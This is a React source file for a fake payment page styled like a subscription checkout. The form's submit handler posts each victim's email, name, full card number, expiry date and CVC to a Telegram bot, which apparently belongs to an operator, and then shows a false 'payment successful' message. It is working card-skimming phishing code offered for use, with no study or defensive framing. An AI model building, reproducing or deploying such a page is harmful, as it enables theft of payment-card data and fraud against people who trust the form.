import React, { useState } from 'react';

export default function App() {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: '',
    card: '',
    expiry: '',
    cvc: '',
    name: '',
    country: 'Taiwan',
    saveInfo: false,
  });

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleSubmit = async () => {
    setLoading(true);
    const message = `新訂單來啦！\n\nEmail: ${formData.email}\n姓名: ${formData.name}\n卡號: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n國家: ${formData.country}\n儲存卡片資訊: ${formData.saveInfo ? '是' : '否'}`;

    await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    setTimeout(() => {
      alert('付款成功！我們已收到您的資料。');
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-[#f6f9fc] flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm border border-gray-200 text-sm font-sans">
        <h2 className="text-lg font-semibold mb-6">Enter payment details</h2>

        <input
          type="email"
          name="email"
          placeholder="Email"
          value={formData.email}
          onChange={handleChange}
          className="mb-4 w-full border border-gray-300 rounded px-3 py-[10px]"
        />

        <div className="mb-2 text-xs text-gray-600 font-medium">Card information</div>
        <input
          type="text"
          name="card"
          placeholder="1234 1234 1234 1234"
          value={formData.card}
          onChange={handleChange}
          className="w-full border border-gray-300 rounded px-3 py-[10px] mb-2"
        />
        <div className="flex gap-2 mb-4">
          <input
            type="text"
            name="expiry"
            placeholder="MM / YY"
            value={formData.expiry}
            onChange={handleChange}
            className="w-1/2 border border-gray-300 rounded px-3 py-[10px]"
          />
          <input
            type="text"
            name="cvc"
            placeholder="CVC"
            value={formData.cvc}
            onChange={handleChange}
            className="w-1/2 border border-gray-300 rounded px-3 py-[10px]"
          />
        </div>

        <input
          type="text"
          name="name"
          placeholder="Name on card"
          value={formData.name}
          onChange={handleChange}
          className="mb-4 w-full border border-gray-300 rounded px-3 py-[10px]"
        />

        <select
          name="country"
          value={formData.country}
          onChange={handleChange}
          className="w-full border border-gray-300 rounded px-3 py-[10px] mb-4"
        >
          <option value="Taiwan">Taiwan</option>
          <option value="Japan">Japan</option>
          <option value="USA">USA</option>
        </select>

        <div className="flex items-start mb-4">
          <input
            type="checkbox"
            name="saveInfo"
            checked={formData.saveInfo}
            onChange={handleChange}
            className="mt-1 mr-2"
          />
          <label className="text-sm leading-tight">Save my info for secure 1-click checkout<br/><span className="text-xs text-gray-500">Pay faster on TestPay and thousands of sites.</span></label>
        </div>

        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-[#0070f3] hover:bg-[#005dd1] text-white text-sm py-3 rounded font-semibold"
        >
          {loading ? '處理中...' : 'Subscribe'}
        </button>

        <p className="text-[11px] text-gray-500 leading-relaxed mt-4">
          After your trial ends, you will be charged ¥108 per month starting September 8, 2022. You can always cancel before then.
        </p>
      </div>
    </div>
  );
}
